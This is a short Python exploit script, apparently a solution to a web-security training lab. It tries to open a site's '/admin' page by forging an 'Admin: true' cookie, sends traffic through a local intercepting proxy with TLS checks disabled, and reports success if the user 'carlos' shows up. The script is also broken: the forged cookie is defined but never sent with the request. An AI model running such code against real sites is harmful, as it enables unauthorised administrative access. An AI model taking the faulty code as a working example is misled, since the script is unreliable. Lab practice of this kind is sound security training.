import sys
import urllib3
import requests
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}



def exploit_access_control(s, url):
    path = '/admin'
    cookie = {'Admin':'true'}

    r = s.get(url+path, verify=False, proxies=proxies)
    if "carlos" in r.text:
        print("(+) Logged in as administarator! ")
    

if __name__ =='__main__':
    try:
        url = sys.argv[1]   
    except IndexError:
        print("Usage: python %s <url>" %sys.argv[0])
        print("Example: python %s example.com" %sys.argv[0])
        sys.exit(1)
    s = requests.session()
    exploit_access_control(s, url)